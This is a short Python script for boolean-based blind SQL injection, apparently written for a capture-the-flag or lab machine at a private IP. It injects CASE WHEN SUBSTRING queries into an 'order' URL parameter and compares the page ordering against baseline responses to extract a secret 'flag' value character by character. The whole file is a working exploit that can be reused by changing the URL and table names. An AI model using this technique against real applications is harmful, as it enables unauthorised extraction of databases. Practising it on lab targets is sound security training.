"""
Author      : AnyGuy
Date        : 2023-06-06

Title       : case-blind-sqli.py

Description : Blind SQLi to test every char against a value inside the table
    
    - xy
    - xy
    - xy

"""

# Import Libraries
import requests
import os

# Change the current working directory to the script's directory
os.chdir(os.path.dirname(os.path.abspath(__file__)))

#########################################
# CHANGE HERE URL FOR INJECTION OF SQLi #
url = "http://10.10.38.117/?order="
# CHANGE HERE URL FOR INJECTION OF SQLi #
#########################################

# Get Wordlists
with open('wordlist-ascii-code.txt', 'r') as f:
    ascii_code_wordlist = f.read().splitlines()

with open('wordlist-char.txt', 'r') as f:
    ascii_char_wordlist = f.read().splitlines()

title_request_text = requests.get(url=url+'title').text
date_request_text = requests.get(url=url+'date').text

# Define Variables
flag = ""
counter = 1
key = True

# Function
while key:
    for i in ascii_char_wordlist:
        query = f"(CASE WHEN (SELECT (SUBSTRING(flag,1,{counter})) FROM flag) = '{flag+i}' THEN title ELSE date END) ASC"
        req = requests.get(url=url+query).text

        if req == title_request_text:
            flag = flag+i
            counter += 1
            break

        elif req == date_request_text:
            pass

        else:
            print("error")

        if i == "}":
            print("[-] Data could not be extracted beyond this char !")
            key = False

    # Print the flag
    print(f"[+] Flag is : {flag}")